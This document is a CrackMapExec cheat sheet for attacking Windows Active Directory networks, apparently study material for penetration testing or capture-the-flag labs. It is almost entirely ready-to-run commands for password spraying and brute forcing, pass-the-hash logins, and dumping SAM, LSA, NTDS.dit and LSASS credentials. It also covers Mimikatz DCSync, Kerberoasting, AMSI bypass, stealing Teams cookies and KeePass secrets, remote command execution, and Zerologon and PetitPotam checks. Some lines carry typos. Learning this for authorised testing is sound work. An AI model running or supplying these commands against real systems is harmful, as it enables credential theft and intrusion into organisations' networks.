# CME Quick Reference

## Modules

```
cme smb -L
```

#### Using Modules

```
cme smb <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz
```

#### Viewing Module Options

```
cme smb -M mimikatz --options
```

#### Using Module Options

```
cme <protocol> <target(s)> -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
```

## Kerberos

```
cme smb zoro.gold.local -k -u bonclay -p Ocotober2022
```

#### using `--use-kcache`

```
export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache 
cme smb zoro.gold.local --use-kcache
```

```
cme smb zoro.gold.local --use-kcache -x whoami
```

```
cme ldap poudlard.wizard -k --kdcHost dc01.poudlard.wizard
```

## Scan for Vulnerabilities

#### Zerologon

```
cme smb <ip> -u '' -p '' -M zerologo
```

#### PetitPotam

```
cme smb <ip> -u '' -p '' -M petitpotam
```

#### noPAC

```
cme smb <ip> -u 'user' -p 'pass' -M nopac
```

## Enumeration

#### Map Network Hosts

```
cme smb 192.168.1.0/24
```

#### Null Sessions

```
cme smb 10.10.10.161 -u '' -p ''
cme smb 10.10.10.161 --pass-pol
cme smb 10.10.10.161 --users
cme smb 10.10.10.161 --groups
```

#### Anonymous Logon

```
cme smb 10.10.10.178 -u 'a' -p ''
```

#### Active Sessions

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions
```

#### Shares and Access

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --shares
```

#### Disks

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --disks
```

#### Logged on Users

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
```

#### Domain Users

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --usersBruteForce RID 
```

#### BruteForcing RID

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --rid-brute
```

#### Domain Groups

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --groups
```

#### Local Groups

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-group
```

#### Password Policy

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --pass-pol
```

#### SMB Signing NOT Required

```
cme smb 192.168.1.0/24 --gen-relay-list relaylistOutputFilename.txt
```

## Password Spraying

#### Username and Password Lists

```
cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18
cme smb 192.168.1.101 -u user1 -p password1 password2 password3
cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18
cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt
cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success
```

#### Checking Login&#x20;

```
cme smb 192.168.1.101 -u user.txt -p user.txt
```

#### Checking Multiple Logins with username and password list

```
cme smb 192.168.1.101 -u user.txt -p password.txt
```

#### Checking one login equal one password using wordlist

```
cme smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-succes
```

## Authentication

#### Checking Credentials Domain

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE'
```

#### Using Credentials

```
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'
cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'
cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'
cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

#### Checking Credentials Local

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth
cme smb 192.168.1.0/24 -u '' -p '' --local-auth
cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth
cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth
cme smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
cme smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```

## Remote Command Execution

#### Execute commands with -x

```
cme 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
```

#### Execute PowerShell Scripts with -X

```
cme 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'
```

#### Bypass AMSI

```
cme 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable'  --amsi-bypass /path/payload
```

#### List all readable files

```
cme smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus
```

#### Dump all Files

```
cme smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false
```

#### Send Files

```
cme smb 172.16.251.152 -u user -p pass --put-file /tmp/whoami.txt \\Windows\\Temp\\whoami.txt
cme mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --put-file  --put-file /tmp/users C:\\Windows\\Temp\\whoami.txt
```

#### Get Files

```
cme smb 172.16.251.152 -u user -p pass --get-file  \\Windows\\Temp\\whoami.txt /tmp/whoami.txt
cme mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --get-file C:\\Windows\\Temp\\whoami.txt /tmp/file
```

#### WinRM

```
cme winrm 192.168.255.131 -u user -p 'password' -X whoami
```

#### MSSQL

```
cme mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
cme mssql 10.10.10.59 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami
```

#### SSH

```
cme ssh 127.0.0.1 -u user -p password -x whoami
```

## Obtaining Credentials

#### Dump SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

#### Dump LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

#### Dump NTDS.dit

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

#### Dump LSASS

```
cme smb 192.168.255.131 -u administrator -p pass -M lsassy
```

#### Dump LSASS using nanodump

```
cme smb 192.168.255.131 -u administrator -p pass -M nanodump
```

#### Mimikatz

```
cme smb 192.168.255.131 -u administrator -p pass -M mimikatz
```

#### Mimikatz DCSYNC

```
cme smb 192.168.255.131 -u Administrator -p pass -M mimikatz -o COMMAND='"lsadump::dcsync /domain:domain.local /user:krbtgt"
```

#### Dump WIFI Password

```
cme smb <ip> -u user -p pass -M wireless
```

#### Dump KeyPass

```
cme smb <ip> -u user -p pass -M keepass_discovery
cme smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"
```

## LAPS

```
cme smb <ip> -u user-can-read-laps -p pass --laps
cme smb <ip> -u user-can-read-laps -p pass --laps <name if not administrator>
cme winrm <ip> -u user-can-read-laps -p pass --laps
```

## Spooler

```
cme smb <ip> -u 'user' -p 'pass' -M spooler
```

## WebDAV

```
cme smb <ip> -u 'user' -p 'pass' -M webdav
```

## Steal MS Teams Cookies

```
cme smb <ip> -u user -p pass -M teams_localdb
```

## LDAP

#### LDAP Authentication

```
cme ldap 192.168.1.0/24 -u users.txt -p '' -k
cme ldap 192.168.1.0/24 -u user -p password
cme ldap 192.168.1.0/24 -u user -H A29F7623FD11550DEF0192DE9246F46B
```

### ASREPRoast

#### Without Authentication

```
cme ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
cme ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

#### With Authentication

```
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
cme ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name
```

### Find Domain SID

```
cme ldap DC1.scrm.local -u sqlsvc -p Pegasus60 -k --get-sid
```

### Kerberoasting

```
cme ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

### Unconstrained Delegation

```
cme ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
```

### Admin Count

```
cme ldap 192.168.255.131 -u adm -p pass --admin-count
```

### Machine Account Quota

```
cme ldap <ip> -u user -p pass -M maq
```

### Get User Descriptions

```
cme ldap <ip> -u user -p pass -M maq --kdchost 127.0.0.1 -M get-desc-users
```

## Dump gMSA

```
cme ldap <ip> -u <user> -p <pass> --gmsa
```

## Exploit ESC8 (AD CS)

```
cme run ldap <ip> -u user -p pass -M adcs
```

### List all Certificates inside a PKI

```
crackmapexec run ldap <ip> -u user -p pass -M adcs -o SERVER=xxxx
```

## Extract Subnet

```
cme ldap <ip> -u <user> -p <pass> -M get-network
cme ldap <ip> -u <user> -p <pass> -M get-network -o ONLY_HOSTS=true
cme ldap <ip> -u <user> -p <pass> -M get-network -o ALL=true
```

## Check LDAP Signing

```
cme ldap <ip> -u user -p pass -M ldap-checker
```

## Read DACL Right

```
cme ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read
cme ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=BlWasp
cme ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET_DN="DC=lab,DC=LOCAL" ACTION=read RIGHTS=DCSync
cme ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied
cme ldap lab-dc.lab.local -k --kdcHost lab-dc.lab.local -M daclread -o TARGET=../../targets.txt ACTION=backup
```

## Password Spraying

### WinRM

```
cme winrm 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

### MSSQL

```
cme mssql 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

### SSH

```
cme ssh 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

### FTP

```
cme ftp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

### RDP

```
cme rdp 192.168.1.0/24 -u user -p password
cme rdp 192.168.133.157 -u ron -p October2021
cme rdp 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

## Autrhentication

### WInRM

```
cme winrm 192.168.1.0/24 -u user -p password
cme winrm 192.168.1.0/24 -u user -p password -d DOMAIN
```

### MSSQL

```
cme mssql 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
cme mssql 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!' -d HTB
cme mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth
cme mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --port 1434
```

### SSH

```
cme ssh 192.168.1.0/24 -u user -p password
```

